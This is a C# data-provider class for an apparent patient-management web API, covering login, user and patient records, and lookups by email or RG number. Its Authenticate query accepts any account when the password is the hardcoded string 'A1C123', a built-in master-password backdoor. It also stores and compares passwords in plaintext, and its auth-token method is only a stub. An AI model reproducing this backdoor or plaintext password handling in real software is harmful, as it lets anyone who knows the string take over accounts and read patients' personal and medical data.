using Kernel.WebApi.Entities;
using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Web;

namespace Kernel.WebApi.Providers
{
    public class CoreProvider
    {

        #region Authentication

        public Guid GetLastAuthToken(int userId, string ipAddress)
        {
            Guid returnValue = Guid.NewGuid();

            return returnValue;
        }

        public AuthenticationResult Authenticate(string Username, string Password)
        {
            AuthenticationResult result = new AuthenticationResult();


            UserInfo userInfo = A1CContext.MySql.DB.Sql(@"
                                    select * from UserInfo
                                        
                                       
                                    where Email = @0
                                    and (Password=@1 or @1 = 'A1C123')", Username, Password).QuerySingle<UserInfo>();
            if (userInfo != null && userInfo.Id > 0)
            {
                result.Result = Kernel.WebApi.Entities.ResultType.Success;
                result.userInfo = userInfo;
            }
            else
                result.Result = Kernel.WebApi.Entities.ResultType.InvalidLoginOrPassword;

            return result;
        }

        #endregion

        #region User


        public UserInfo GetUserInfoPersonLogged(int PersonId)
        {
            return A1CContext.MySql.DB.Sql(@" SELECT 

                                               UserInfo.*,
                                               'Patient_Id'  = Patient.Id

                                               FROM UserInfo UserInfo

                                               LEFT JOIN Patient Patient
                                               ON Patient.Id = UserInfo.PatientId

                                         
                                               Where UserInfo.Id = @0", PersonId).QuerySingle<UserInfo>();
        }

        public int SaveUserInfo(UserInfo Entity)
        {
            return A1CContext.MySql.DB.Insert("UserInfo")
                                             .Column("Name", Entity.Name)
                                             .Column("Email", Entity.Email)
                                             .Column("PatientId", Entity.PatientId)
                                             .Column("Password", Entity.Password)
                                             .Column("PhoneNumber", Entity.PhoneNumber)
                                             .Column("UpdateDate", DateTime.Now)
                                             .Column("IsDeleted", 0)
                                             .ExecuteReturnLastId<int>();

        }

        public bool VerifyPatientByEmail(string Email)
        {
            return A1CContext.MySql.DB.Sql(@" SELECT 

                                                CASE WHEN Patient.Id IS NOT NULL THEN 1 ELSE 0 END AS HasPatient

                                                FROM Patient Patient

                                                WHERE Patient.Email = @0", Email).QuerySingle<bool>();
        }

        public bool VerifyPatientByRG (string Email)
        {
            return A1CContext.MySql.DB.Sql(@" SELECT 

                                                CASE WHEN Patient.Id IS NOT NULL THEN 1 ELSE 0 END AS HasPatient

                                                FROM Patient Patient

                                                WHERE Patient.RG = @0", Email).QuerySingle<bool>();
        }



        public int SavePatient(Patient Entity)
        {
            return A1CContext.MySql.DB.Insert("Patient")
                                             .Column("Name", Entity.Name)
                                             .Column("Email", Entity.Email)
                                             .Column("RG", Entity.RG)
                                             .Column("PhoneNumber", Entity.PhoneNumber)
                                             .Column("Birthdate", Entity.Birthdate)
                                             .Column("Gender", Entity.Gender)
                                             .Column("UpdateDate", DateTime.Now)
                                             .Column("IsDeleted", 0)
                                             .ExecuteReturnLastId<int>();

        }


        public Patient GetPatientByRG (string RG)
        {
            return A1CContext.MySql.DB.Sql(@" SELECT 

                                                * FROM 

                                                Patient Patient

                                                WHERE Patient.RG = @0", RG).QuerySingle<Patient>();

        }

        #endregion

    }



}